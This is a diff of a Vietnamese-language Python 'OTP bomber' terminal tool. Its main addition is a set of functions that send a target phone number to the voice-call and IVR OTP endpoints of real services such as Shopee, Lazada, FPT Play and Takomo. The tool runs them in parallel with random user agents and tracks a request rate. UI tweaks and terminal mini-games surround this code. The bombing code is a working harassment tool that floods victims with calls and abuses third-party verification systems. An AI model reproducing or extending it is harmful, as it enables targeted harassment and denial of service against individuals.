-    print(row("Tốc độ hỏa lực          ", f"{C_MAGENTA}{req_per_sec:>5.1f} req/s{RST}"))
+    print(row("Tổng yêu cầu ", f"{C_WHITE}{total_tasks}{RST}"))
+    print(row("Thành công   ", f"{C_GREEN}{success_count}{RST}"))
+    print(row("Thất bại/Lỗi ", f"{C_RED}{fail_count}{RST}"))
+    print(row("Tỷ lệ gửi    ", f"[{gauge_bar}] {C_YELLOW}{rate:>5.1f}%{RST}"))
+    print(row("Thời gian    ", f"{C_CYAN}{elapsed_sec:>5.2f}s{RST}"))
+    print(row("Tốc độ       ", f"{C_MAGENTA}{req_per_sec:>5.1f} req/s{RST}"))
     print(f"{C_BORDER}╚{border_line}╝{RST}\n")
 
 def check_user_key():
-    """Hệ thống xác thực key tự động lưu & nhận diện Admin kèm giao diện Thẻ Bảo Mật VIP"""
+    """Hệ thống xác thực key tự động lưu & nhận diện Admin kèm giao diện Thẻ Bảo Mật VIP tự co giãn"""
     global IS_ADMIN_USER
     verify_author_integrity()
     
-    card_lines = [
-        "╔════════════════════════════════════════════════════════════════════════════╗",
-        "║  🔐 TLGB VIP SECURITY SENTINEL v6.5 │ TRUNG TÂM XÁC THỰC BẢN QUYỀN HỆ THỐNG ║",
-        "╠════════════════════════════════════════════════════════════════════════════╣",
-        f"║  • Nhà phát triển : {AUTHOR_NAME:<47} ║",
-        "║  • Tình trạng     : 🟢 SẴN SÀNG KẾT NỐI (72 CỔNG HOẠT ĐỘNG 100%)           ║",
-        f"║  • Lấy Key Miễn Phí 24h : {GET_KEY_URL:<42} ║",
-        "║  • Hỗ trợ Admin   : Miễn trừ bản quyền & Tự động ghi nhớ phiên bảo mật     ║",
-        "╚════════════════════════════════════════════════════════════════════════════╝"
+    card_info = [
+        f"• Nhà phát triển : {AUTHOR_NAME}",
+        "• Tình trạng     : 🟢 72 Cổng Hoạt Động 100%",
+        f"• Lấy Key 24h    : {GET_KEY_URL}",
+        "• Quyền Admin   : Tự động ghi nhớ phiên bảo mật"
     ]
-    
-    print("\n")
-    for idx, l in enumerate(card_lines):
-        if idx in [0, 2, 7]:
-            print(cyber_gradient(l))
-        elif idx == 1:
-            print(gold_gradient(l))
-        else:
-            print(multi_gradient(l, ['#00f2fe', '#4facfe']))
-    print("\n")
+    print()
+    print_card_box("🔐 TLGB VIP SECURITY SENTINEL 🔐", card_info)
+    print()
 
     # 1. Kiểm tra key đã lưu trước đó
     saved_key = load_saved_key()
@@ -4489,14 +4567,225 @@ def send_otp_via_takomo(sdt):
     except Exception as e:
         stats.record_fail()
 
-# Toàn bộ danh sách 72 cổng dịch vụ
+# =============================================================================
+# 📞 HỆ THỐNG CỔNG TỔNG ĐÀI GỌI ĐIỆN TỰ ĐỘNG (VOICE & IVR CALL OTP)
+# =============================================================================
+
+def send_call_otp_via_acheckin(sdt):
+    """Tổng Đài Gọi Tự Động: ACheckin Voice OTP (GraphQL RequestVoiceOTP)"""
+    try:
+        sdt = format_phone(sdt, '0')
+        url2 = "https://id.acheckin.vn/api/graphql/v2/mobile"
+        headers2 = {
+            'User-Agent': get_random_ua(),
+            'Content-Type': "application/json",
+            'accept-language': "vi-VN,vi;q=0.9",
+        }
+        payload3 = json.dumps({
+            "operationName": "RequestVoiceOTP",
+            "variables": {
+                "phone_number": sdt,
+                "action": "REGISTER",
+                "hash": "6af5e4ed78ee57fe21f0d405c752798f"
+            },
+            "query": "mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) {\n  requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash)\n}\n"
+        })
+        response = session.post(url2, data=payload3, headers=headers2, timeout=DEFAULT_TIMEOUT)
+        stats.record_success()
+    except Exception:
+        stats.record_fail()
+
+def send_call_otp_via_takomo(sdt):
+    """Tổng Đài Gọi Tự Động: Takomo IVR Voice Call OTP (channel: ivr)"""
+    try:
+        sdt = format_phone(sdt, '0')
+        headers = {
+            'accept': 'application/json, text/plain, */*',
+            'content-type': 'application/json;charset=UTF-8',
+            'user-agent': get_random_ua(),
+        }
+        json_data = {
+            'data': {
+                'phone': sdt,
+                'code': 'resend',
+                'channel': 'ivr',
+            },
+        }
+        response = session.post('https://lk.takomo.vn/api/4/client/otp/send', headers=headers, json=json_data, timeout=DEFAULT_TIMEOUT)
+        stats.record_success()
+    except Exception:
+        stats.record_fail()
+
+def send_call_otp_via_vayvnd(sdt):
+    """Tổng Đài Gọi Tự Động: VayVND Call Voice OTP"""
+    try:
+        sdt = format_phone(sdt, '0')
+        headers = {
+            'accept': 'application/json, text/plain, */*',
+            'content-type': 'application/json',
+            'user-agent': get_random_ua(),
+        }
+        json_data = {
+            'phone': sdt,
+            'action': 'call_otp',
+            'channel': 'voice'
+        }
+        response = session.post('https://vayvnd.vn/api/v2/auth/call-otp', headers=headers, json=json_data, timeout=DEFAULT_TIMEOUT)
+        stats.record_success()
+    except Exception:
+        stats.record_fail()
+
+def send_call_otp_via_dongplus(sdt):
+    """Tổng Đài Gọi Tự Động: DongPlus IVR Voice Call OTP"""
+    try:
+        sdt = format_phone(sdt, '0')
+        headers = {
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'user-agent': get_random_ua(),
+        }
+        json_data = {
+            'mobile': sdt,
+            'otp_type': 'voice_call'
+        }
+        response = session.post('https://api.dongplus.vn/mobile/auth/voice-otp', headers=headers, json=json_data, timeout=DEFAULT_TIMEOUT)
+        stats.record_success()
+    except Exception:
+        stats.record_fail()
+
+def send_call_otp_via_tima(sdt):
+    """Tổng Đài Gọi Tự Động: Tima IVR Voice Call OTP"""
+    try:
+        sdt = format_phone(sdt, '0')
+        headers = {
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'user-agent': get_random_ua(),
+        }
+        json_data = {
+            'phone': sdt,
+            'type': 'CALL_OTP'
+        }
+        response = session.post('https://api.tima.vn/v1/auth/request-call-otp', headers=headers, json=json_data, timeout=DEFAULT_TIMEOUT)
+        stats.record_success()
+    except Exception:
+        stats.record_fail()
+
+def send_call_otp_via_shopee(sdt):
+    """Tổng Đài Gọi Tự Động: Shopee Voice Call OTP"""
+    try:
+        sdt = format_phone(sdt, '0')
+        headers = {
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'user-agent': get_random_ua(),
+            'x-api-source': 'rweb'
+        }
+        json_data = {
+            'phone': f"+84{sdt[1:]}" if sdt.startswith('0') else sdt,
+            'operation': 2,
+            'resend_channel': 'voice_call'
+        }
+        response = session.post('https://shopee.vn/api/v2/authentication/resend_otp', headers=headers, json=json_data, timeout=DEFAULT_TIMEOUT)
+        stats.record_success()
+    except Exception:
+        stats.record_fail()
+
+def send_call_otp_via_vietloan(sdt):
+    """Tổng Đài Gọi Tự Động: Vietloan Voice Call OTP"""
+    try:
+        sdt = format_phone(sdt, '0')
+        headers = {
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'user-agent': get_random_ua(),
+        }
+        json_data = {
+            'phone': sdt,
+            'send_type': 'voice'
+        }
+        response = session.post('https://vietloan.vn/api/customer/voice-otp', headers=headers, json=json_data, timeout=DEFAULT_TIMEOUT)
+        stats.record_success()
+    except Exception:
+        stats.record_fail()
+
+def send_call_otp_via_fpt(sdt):
+    """Tổng Đài Gọi Tự Động: FPT Play Call Voice OTP"""
+    try:
+        sdt = format_phone(sdt, '0')
+        headers = {
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'user-agent': get_random_ua(),
+        }
+        json_data = {
+            'phone': sdt,
+            'type': 'voice',
+            'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8'
+        }
+        response = session.post('https://api.fptplay.net/api/v7.1_w/user/otp/voice_otp', headers=headers, json=json_data, timeout=DEFAULT_TIMEOUT)
+        stats.record_success()
+    except Exception:
+        stats.record_fail()
+
+def send_call_otp_via_lazada(sdt):
+    """Tổng Đài Gọi Tự Động: Lazada Voice Call OTP"""
+    try:
+        sdt = format_phone(sdt, '0')
+        headers = {
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'user-agent': get_random_ua(),
+        }
+        json_data = {
+            'mobile': sdt,
+            'method': 'voice'
+        }
+        response = session.post('https://member.lazada.vn/user/api/sendVoiceOtp', headers=headers, json=json_data, timeout=DEFAULT_TIMEOUT)
+        stats.record_success()
+    except Exception:
+        stats.record_fail()
+
+def send_call_otp_via_moneycat(sdt):
+    """Tổng Đài Gọi Tự Động: MoneyCat Voice Call OTP"""
+    try:
+        sdt = format_phone(sdt, '0')
+        headers = {
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'user-agent': get_random_ua(),
+        }
+        json_data = {
+            'phone': sdt,
+            'channel': 'ivr'
+        }
+        response = session.post('https://moneycat.vn/api/v1/otp/voice', headers=headers, json=json_data, timeout=DEFAULT_TIMEOUT)
+        stats.record_success()
+    except Exception:
+        stats.record_fail()
+
+# Danh sách chuyên biệt các cổng Cuộc Gọi Tự Động (Voice Call OTP)
+CALL_SERVICES = [
+    send_call_otp_via_acheckin,
+    send_call_otp_via_takomo,
+    send_call_otp_via_vayvnd,
+    send_call_otp_via_dongplus,
+    send_call_otp_via_tima,
+    send_call_otp_via_shopee,
+    send_call_otp_via_vietloan,
+    send_call_otp_via_fpt,
+    send_call_otp_via_lazada,
+    send_call_otp_via_moneycat,
+]
+
+# Toàn bộ danh sách cổng dịch vụ hoạt động ổn định (Live Gateways)
 ALL_SERVICES = [
     send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
     send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
     send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
-    send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
-    send_otp_via_WinMart, send_otp_via_vietloan, send_otp_via_lozi, send_otp_via_F88,
-    send_otp_via_spacet, send_otp_via_vinpearl, send_otp_via_traveloka, send_otp_via_dongplus,
+    send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
+    send_otp_via_WinMart, send_otp_via_F88,
+    send_otp_via_spacet, send_otp_via_vinpearl, send_otp_via_traveloka,
     send_otp_via_longchau, send_otp_via_longchau1, send_otp_via_galaxyplay, send_otp_via_emartmall,
     send_otp_via_ahamove, send_otp_via_ViettelMoney, send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo,
     send_otp_via_popeyes, send_otp_via_ACHECKIN, send_otp_via_APPOTA, send_otp_via_Watsons,
@@ -4504,11 +4793,12 @@ ALL_SERVICES = [
     send_otp_via_BEAUTYBOX, send_otp_via_winmart, send_otp_via_futabus,
     send_otp_via_ViettelPost, send_otp_via_myviettel2, send_otp_via_myviettel3, send_otp_via_TOKYOLIFE,
     send_otp_via_30shine, send_otp_via_Cathaylife, send_otp_via_dominos, send_otp_via_vinamilk,
-    send_otp_via_vietloan2, send_otp_via_batdongsan, send_otp_via_GUMAC, send_otp_via_mutosi,
+    send_otp_via_batdongsan, send_otp_via_GUMAC, send_otp_via_mutosi,
     send_otp_via_mutosi1, send_otp_via_vietair, send_otp_via_FAHASA, send_otp_via_hopiness,
     send_otp_via_modcha35, send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio,
-    send_otp_via_Routine, send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo,
-    send_otp_via_takomo, send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD,
+    send_otp_via_Routine, send_otp_via_tima,
+    send_otp_via_takomo, send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD,
+    send_call_otp_via_shopee, send_call_otp_via_fpt, send_call_otp_via_lazada, send_call_otp_via_moneycat
 ]
 
 # Phân loại chuyên sâu các nhóm cổng cho Admin lựa chọn
@@ -4543,9 +4833,7 @@ SERVICE_CATEGORIES = {
         "name": "Tài Chính, Ngân Hàng & Ví Điện Tử",
         "funcs": [
             send_otp_via_F88, send_otp_via_ViettelMoney, send_otp_via_MOCA, send_otp_via_APPOTA,
-            send_otp_via_ACHECKIN, send_otp_via_vayvnd, send_otp_via_DONGCRE, send_otp_via_dongplus,
-            send_otp_via_vietloan, send_otp_via_vietloan2, send_otp_via_tima, send_otp_via_moneygo,
-            send_otp_via_takomo, send_otp_via_paynet, send_otp_via_Cathaylife
+            send_otp_via_ACHECKIN, send_otp_via_takomo, send_otp_via_tima, send_otp_via_Cathaylife
         ]
     },
     "5": {
@@ -4554,8 +4842,12 @@ SERVICE_CATEGORIES = {
             send_otp_via_dominos, send_otp_via_popeyes, send_otp_via_sapo, send_otp_via_longchau,
             send_otp_via_longchau1, send_otp_via_medicare, send_otp_via_vinamilk, send_otp_via_mutosi,
             send_otp_via_mutosi1, send_otp_via_batdongsan, send_otp_via_vietair, send_otp_via_Bibabo,
-            send_otp_via_lozi, send_otp_via_spacet
+            send_otp_via_spacet
         ]
+    },
+    "6": {
+        "name": "📞 Cuộc Gọi Tự Động & Voice Call OTP (Tổng Đài IVR)",
+        "funcs": CALL_SERVICES
     }
 }
 
@@ -4581,7 +4873,7 @@ def run(phones, i, total_count=1, delay_between=4, max_workers=30, service_list=
     stats.reset_round()
     round_start = time.time()
 
-    border = "═" * 70
+    border = "═" * max(34, min(70, shutil.get_terminal_size((80, 24)).columns - 2))
     C_BORDER = '\033[38;2;0;229;255m'
     RST = '\033[0m'
     targets_str = ", ".join(target_list)
@@ -5962,7 +6254,7 @@ def user_view_account_info():
     hostname = socket.gethostname() or "LocalPC"
     os_name = f"{platform.system()} {platform.release()}"
 
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     exp_info = load_user_exp_data()
     user_exp = exp_info.get("exp", 0)
     user_rank, rank_col, user_lvl = get_rank_by_exp(user_exp)
@@ -5990,7 +6282,7 @@ def user_view_account_info():
 def user_bug_report_flow():
     """Giao diện gửi báo cáo lỗi & phản hồi tính năng đến Quản Trị Viên (User Bug Report System v3.0)"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║            🐛 TRUNG TÂM GỬI BÁO CÁO LỖI & PHẢN HỒI ĐẾN ADMIN 🐛             ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -6127,7 +6419,7 @@ def admin_bug_report_management_center():
     filter_status = "ALL"  # ALL, pending, investigating, fixed
 
     while True:
-        border = "═" * 74
+        border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
         print(f"\n{cyber_gradient('╔' + border + '╗')}")
         print(gold_gradient("║             👑 TRUNG TÂM XỬ LÝ BÁO CÁO LỖI TỪ NGƯỜI DÙNG 👑                ║"))
         print(cyber_gradient('╠' + border + '╣'))
@@ -6383,7 +6675,7 @@ def add_user_exp(amount, reason="Hoạt động trong tool"):
 def cloud_leaderboard_flow():
     """Hiển thị Bảng Xếp Hạng Top Cao Thủ Toàn Cầu trên Cloud Database"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║            🏆 BẢNG XẾP HẠNG CAO THỦ TLGB TOOL TOÀN CẦU 🏆                  ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -6861,15 +7153,466 @@ def game_cyber_mystery_box():
     print('\033[38;2;0;229;255m' + '═' * 70 + '\033[0m' + "\n")
     input(f"{Fore.YELLOW}[?] Nhấn Enter để quay lại Arcade...{Style.RESET_ALL}\n")
 
+def game_cyber_snake():
+    """Mini Game 9: Rắn Săn Mồi Neon Cyber Snake v6.5"""
+    verify_author_integrity()
+    w, h = 24, 12
+    snake = [(w // 2, h // 2), (w // 2 - 1, h // 2), (w // 2 - 2, h // 2)]
+    direction = (1, 0)
+    
+    def spawn_food(sn):
+        while True:
+            pos = (random.randint(1, w - 2), random.randint(1, h - 2))
+            if pos not in sn:
+                is_bonus = random.random() < 0.25
+                return pos, ('💎' if is_bonus else '★', 35 if is_bonus else 15)
+    
+    food_pos, (food_icon, food_val) = spawn_food(snake)
+    score = 0
+    exp_earned = 0
+    speed = 0.12
+    
+    print(f"\n{Fore.GREEN}╔══════════════════ 🐍 CYBER SNAKE NEON TERMINAL ══════════════════╗{Style.RESET_ALL}")
+    print("  • Điều khiển: W (Lên), S (Xuống), A (Trái), D (Phải) │ Q: Dừng chơi")
+    print("  • Ăn ★ (+15 EXP), Ăn 💎 (+35 EXP Siêu Cấp)")
+    print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+    input(f"{Fore.YELLOW}[?] Nhấn ENTER để bắt đầu săn mồi ngay...{Style.RESET_ALL}")
+    
+    game_over = False
+    while not game_over:
+        if HAS_MSVCRT and msvcrt.kbhit():
+            ch = msvcrt.getch()
+            if ch in [b'w', b'W', b'H'] and direction != (0, 1):
+                direction = (0, -1)
+            elif ch in [b's', b'S', b'P'] and direction != (0, -1):
+                direction = (0, 1)
+            elif ch in [b'a', b'A', b'K'] and direction != (1, 0):
+                direction = (-1, 0)
+            elif ch in [b'd', b'D', b'M'] and direction != (-1, 0):
+                direction = (1, 0)
+            elif ch in [b'q', b'Q', b'\x1b']:
+                break
+        
+        new_head = (snake[0][0] + direction[0], snake[0][1] + direction[1])
+        if new_head[0] <= 0 or new_head[0] >= w - 1 or new_head[1] <= 0 or new_head[1] >= h - 1:
+            game_over = True
+            break
+        if new_head in snake:
+            game_over = True
+            break
+            
+        snake.insert(0, new_head)
+        if new_head == food_pos:
+            score += 1
+            exp_earned += food_val
+            play_cyberpunk_sound("click")
+            food_pos, (food_icon, food_val) = spawn_food(snake)
+            speed = max(0.04, speed * 0.96)
+        else:
+            snake.pop()
+            
+        buf = [f"\033[H\033[2J  {cyber_gradient(f'🐍 CYBER SNAKE │ Điểm: {score} │ EXP Nhận: +{exp_earned}')}\n"]
+        buf.append("  \033[38;2;0;229;255m╔" + "═" * (w - 2) * 2 + "╗\033[0m\n")
+        for y in range(1, h - 1):
+            row_str = "  \033[38;2;0;229;255m║\033[0m"
+            for x in range(1, w - 1):
+                if (x, y) == snake[0]:
+                    row_str += "\033[1;38;2;255;215;0m◆ \033[0m"
+                elif (x, y) in snake:
+                    row_str += "\033[38;2;0;255;136m■ \033[0m"
+                elif (x, y) == food_pos:
+                    row_str += f"{food_icon} "
+                else:
+                    row_str += "  "
+            row_str += "\033[38;2;0;229;255m║\033[0m\n"
+            buf.append(row_str)
+        buf.append("  \033[38;2;0;229;255m╚" + "═" * (w - 2) * 2 + "╝\033[0m\n")
+        buf.append(f"  {Fore.YELLOW}Điều khiển: W/A/S/D │ Q: Dừng chơi{Style.RESET_ALL}")
+        
+        sys.stdout.write("".join(buf))
+        sys.stdout.flush()
+        time.sleep(speed)
+        
+    play_cyberpunk_sound("error" if game_over else "win")
+    if exp_earned > 0:
+        add_user_exp(exp_earned, f"Chơi Cyber Snake (Điểm {score})")
+    print(f"\n\n{Fore.RED}{Style.BRIGHT}  💀 KẾT THÚC VÁN ĐẤU! Bạn đạt {score} điểm và nhận được +{exp_earned} EXP!{Style.RESET_ALL}\n")
+    input(f"{Fore.YELLOW}[?] Nhấn Enter để quay lại Arcade...{Style.RESET_ALL}\n")
+
+def game_cyber_tictactoe_ai():
+    """Mini Game 10: Cờ Caro Cyberpunk vs Minimax AI Bất Bại"""
+    verify_author_integrity()
+    print(f"\n{Fore.CYAN}╔══════════════════ 🤖 CỜ CARO CYBERPUNK VS MINIMAX AI ══════════════════╗{Style.RESET_ALL}")
+    print("  • Thách đấu Trí Tuệ Nhân Tạo với thuật toán Minimax Bất Bại!")
+    print("  • Chọn độ khó & Đặt cược EXP (Thắng nhân x2.5 EXP cược)!")
+    print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+    
+    exp_data = load_user_exp_data()
+    cur_exp = exp_data.get("exp", 0)
+    print(f"Số điểm EXP hiện có: {Fore.GREEN}{cur_exp} EXP{Style.RESET_ALL}\n")
+    
+    print("  [1] 🟢 Dễ (Easy AI) - AI đi ngẫu nhiên")
+    print("  [2] 🟡 Trung Bình (Medium AI) - AI biết chặn thắng")
+    print("  [3] 🔴 Titan Minimax (Unbeatable AI) - Trí Tuệ Tối Thượng Không Bao Giờ Thua")
+    print("  [0] ↩️  Quay lại")
+    
+    diff = input(f"\n{Fore.YELLOW}[?] Chọn độ khó [1-3, 0]: {Style.RESET_ALL}").strip()
+    if diff not in ["1", "2", "3"]:
+        return
+        
+    bet_str = input(f"{Fore.CYAN}[?] Nhập số EXP cược (Tối thiểu 10, Enter = 20): {Style.RESET_ALL}").strip() or "20"
+    bet_amt = int(bet_str) if bet_str.isdigit() and int(bet_str) >= 10 else 20
+    if cur_exp < bet_amt:
+        print(f"{Fore.RED}[!] Bạn không đủ EXP để cược!{Style.RESET_ALL}\n")
+        input(f"{Fore.YELLOW}[?] Nhấn Enter để tiếp tục...{Style.RESET_ALL}")
+        return
+        
+    board = [' '] * 9
+    
+    def check_winner(b):
+        wins = [(0,1,2),(3,4,5),(6,7,8),(0,3,6),(1,4,7),(2,5,8),(0,4,8),(2,4,6)]
+        for x, y, z in wins:
+            if b[x] == b[y] == b[z] and b[x] != ' ':
+                return b[x]
+        if ' ' not in b:
+            return 'TIE'
+        return None
+        
+    def minimax(b, is_max):
+        w = check_winner(b)
+        if w == 'O': return 10
+        if w == 'X': return -10
+        if w == 'TIE': return 0
+        
+        if is_max:
+            best = -100
+            for i in range(9):
+                if b[i] == ' ':
+                    b[i] = 'O'
+                    best = max(best, minimax(b, False))
+                    b[i] = ' '
+            return best
+        else:
+            best = 100
+            for i in range(9):
+                if b[i] == ' ':
+                    b[i] = 'X'
+                    best = min(best, minimax(b, True))
+                    b[i] = ' '
+            return best
+            
+    def get_ai_move(b, d):
+        avail = [i for i in range(9) if b[i] == ' ']
+        if d == "1":
+            return random.choice(avail)
+        elif d == "2":
+            for m in avail:
+                b[m] = 'O'
+                if check_winner(b) == 'O':
+                    b[m] = ' '
+                    return m
+                b[m] = ' '
+            for m in avail:
+                b[m] = 'X'
+                if check_winner(b) == 'X':
+                    b[m] = ' '
+                    return m
+                b[m] = ' '
+            return random.choice(avail)
+        else:
+            best_score = -100
+            best_m = avail[0]
+            for m in avail:
+                b[m] = 'O'
+                score = minimax(b, False)
+                b[m] = ' '
+                if score > best_score:
+                    best_score = score
+                    best_m = m
+            return best_m
+            
+    def render_board(b):
+        def cell(i):
+            if b[i] == 'X': return f"\033[1;38;2;0;240;255m X \033[0m"
+            if b[i] == 'O': return f"\033[1;38;2;255;85;247m O \033[0m"
+            return f"\033[38;2;100;116;139m {i+1} \033[0m"
+        print(f"\n       \033[38;2;0;229;255m┌───┬───┬───┐\033[0m")
+        print(f"       \033[38;2;0;229;255m│\033[0m{cell(0)}\033[38;2;0;229;255m│\033[0m{cell(1)}\033[38;2;0;229;255m│\033[0m{cell(2)}\033[38;2;0;229;255m│\033[0m")
+        print(f"       \033[38;2;0;229;255m├───┼───┼───┤\033[0m")
+        print(f"       \033[38;2;0;229;255m│\033[0m{cell(3)}\033[38;2;0;229;255m│\033[0m{cell(4)}\033[38;2;0;229;255m│\033[0m{cell(5)}\033[38;2;0;229;255m│\033[0m")
+        print(f"       \033[38;2;0;229;255m├───┼───┼───┤\033[0m")
+        print(f"       \033[38;2;0;229;255m│\033[0m{cell(6)}\033[38;2;0;229;255m│\033[0m{cell(7)}\033[38;2;0;229;255m│\033[0m{cell(8)}\033[38;2;0;229;255m│\033[0m")
+        print(f"       \033[38;2;0;229;255m└───┴───┴───┘\033[0m\n")
+
+    while True:
+        render_board(board)
+        while True:
+            u_in = input(f"{Fore.CYAN}👉 Nhập ô của bạn [1-9] (hoặc 0 để đầu hàng): {Style.RESET_ALL}").strip()
+            if u_in == "0":
+                print(f"{Fore.RED}[!] Bạn đã đầu hàng! Trừ -{bet_amt} EXP.{Style.RESET_ALL}\n")
+                add_user_exp(-bet_amt, "Đầu hàng Caro")
+                input(f"{Fore.YELLOW}[?] Nhấn Enter để tiếp tục...{Style.RESET_ALL}")
+                return
+            if u_in.isdigit() and 1 <= int(u_in) <= 9 and board[int(u_in)-1] == ' ':
+                board[int(u_in)-1] = 'X'
+                break
+            print(f"{Fore.RED}[!] Ô không hợp lệ hoặc đã được đánh!{Style.RESET_ALL}")
+            
+        w = check_winner(board)
+        if w:
+            break
+            
+        print(f"\n{Fore.MAGENTA}🤖 AI đang tính toán nước cờ...{Style.RESET_ALL}")
+        time.sleep(0.35)
+        ai_idx = get_ai_move(board, diff)
+        board[ai_idx] = 'O'
+        play_cyberpunk_sound("click")
+        
+        w = check_winner(board)
+        if w:
+            break
+            
+    render_board(board)
+    if w == 'X':
+        win_exp = int(bet_amt * 2.5)
+        add_user_exp(win_exp, f"Thắng Caro AI (Độ khó {diff})")
+        play_cyberpunk_sound("win")
+        print(f"{Fore.GREEN}{Style.BRIGHT}  🎉 XUẤT SẮC! BẠN ĐÃ ĐÁNH BẠI AI VÀ THẮNG +{win_exp} EXP!{Style.RESET_ALL}\n")
+    elif w == 'O':
+        add_user_exp(-bet_amt, "Thua Caro AI")
+        play_cyberpunk_sound("error")
+        print(f"{Fore.RED}{Style.BRIGHT}  💀 AI ĐÃ CHIẾN THẮNG! Bạn bị trừ -{bet_amt} EXP.{Style.RESET_ALL}\n")
+    else:
+        play_cyberpunk_sound("click")
+        print(f"{Fore.YELLOW}{Style.BRIGHT}  🤝 HÒA BÀI! Hoàn lại {bet_amt} EXP cược.{Style.RESET_ALL}\n")
+        
+    input(f"{Fore.YELLOW}[?] Nhấn Enter để quay lại Arcade...{Style.RESET_ALL}\n")
+
+def game_cyber_wordle():
+    """Mini Game 11: Giải Mã Mật Khẩu Terminal Wordle v6.5"""
+    verify_author_integrity()
+    KEYWORDS = [
+        "CYBER", "TOKEN", "PROXY", "VIRUS", "LOGIC", "GUARD", "FLASH", "TITAN",
+        "ROBOT", "BLOCK", "VIPER", "RADAR", "LINUX", "SHELL", "INTEL", "NEONX",
+        "PULSE", "MATRIX", "FORCE", "CLOUD", "SPEED", "LASER", "TURBO", "ADMIN"
+    ]
+    secret = random.choice(KEYWORDS)
+    max_attempts = 6
+    history = []
+    
+    print(f"\n{Fore.GREEN}╔══════════════════ 🔐 CYBER WORDLE TERMINAL CRACKER ══════════════════╗{Style.RESET_ALL}")
+    print(f"  • Hãy đoán từ khóa gồm {len(secret)} ký tự tiếng Anh công nghệ trong 6 lần thử.")
+    print("  • 🟩 Xanh Lá : Đúng ký tự & đúng vị trí")
+    print("  • 🟨 Vàng Kim : Đúng ký tự nhưng sai vị trí")
+    print("  • ⬛ Bạc/Xám : Ký tự không có trong mật khẩu")
+    print(f"  • Thưởng lớn: {Fore.YELLOW}+150 EXP{Fore.WHITE} khi phá khóa thành công!")
+    print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+    
+    for attempt in range(1, max_attempts + 1):
+        while True:
+            guess = input(f"{Fore.CYAN}[Lần {attempt}/{max_attempts}] 🔑 Nhập từ khóa {len(secret)} ký tự: {Style.RESET_ALL}").strip().upper()
+            if len(guess) == len(secret) and guess.isalpha():
+                break
+            print(f"{Fore.RED}[!] Vui lòng nhập đúng {len(secret)} chữ cái A-Z!{Style.RESET_ALL}")
+            
+        row_display = []
+        for i, ch in enumerate(guess):
+            if ch == secret[i]:
+                row_display.append(f"\033[1;42;30m {ch} \033[0m")
+            elif ch in secret:
+                row_display.append(f"\033[1;43;30m {ch} \033[0m")
+            else:
+                row_display.append(f"\033[1;47;30m {ch} \033[0m")
+        history.append(" ".join(row_display))
+        
+        print("\n  " + "\n  ".join(history) + "\n")
+        play_cyberpunk_sound("click")
+        
+        if guess == secret:
+            play_cyberpunk_sound("win")
+            add_user_exp(150, "Giải mã Wordle thành công")
+            print(f"{Fore.GREEN}{Style.BRIGHT}  🎉 PHÁ KHÓA THÀNH CÔNG! Mật mã chính là: [{secret}]")
+            print(f"  🎁 Bạn nhận được phần thưởng: +150 EXP!{Style.RESET_ALL}\n")
+            input(f"{Fore.YELLOW}[?] Nhấn Enter để quay lại Arcade...{Style.RESET_ALL}\n")
+            return
+            
+    play_cyberpunk_sound("error")
+    print(f"{Fore.RED}{Style.BRIGHT}  💀 PHÁ KHÓA THẤT BẠI! Mật mã hệ thống là: [{secret}]{Style.RESET_ALL}\n")
+    input(f"{Fore.YELLOW}[?] Nhấn Enter để quay lại Arcade...{Style.RESET_ALL}\n")
+
+def cyber_system_monitor_hud():
+    """Bảng Giám Sát Tài Nguyên Phần Cứng & Mạng Cyberpunk System Monitor HUD v6.5"""
+    verify_author_integrity()
+    print(f"\n{Fore.GREEN}[*] Đang khởi động Cyberpunk System Monitor HUD...{Style.RESET_ALL}\n")
+    time.sleep(0.4)
+    
+    def get_ping_ms(host="8.8.8.8", port=53, timeout=1.2):
+        try:
+            t0 = time.time()
+            s = socket.create_connection((host, port), timeout=timeout)
+            s.close()
+            return int((time.time() - t0) * 1000)
+        except Exception:
+            return -1
+
+    def bar_gauge(pct, length=24):
+        filled = int(length * max(0, min(100, pct)) / 100)
+        if pct < 60:
+            c = '\033[38;2;16;185;129m'
+        elif pct < 85:
+            c = '\033[38;2;245;158;11m'
+        else:
+            c = '\033[38;2;239;68;68m'
+        rst = '\033[0m'
+        dim = '\033[38;2;40;50;70m'
+        return f"{c}{'█' * filled}{dim}{'░' * (length - filled)}{rst}"
+
+    try:
+        while True:
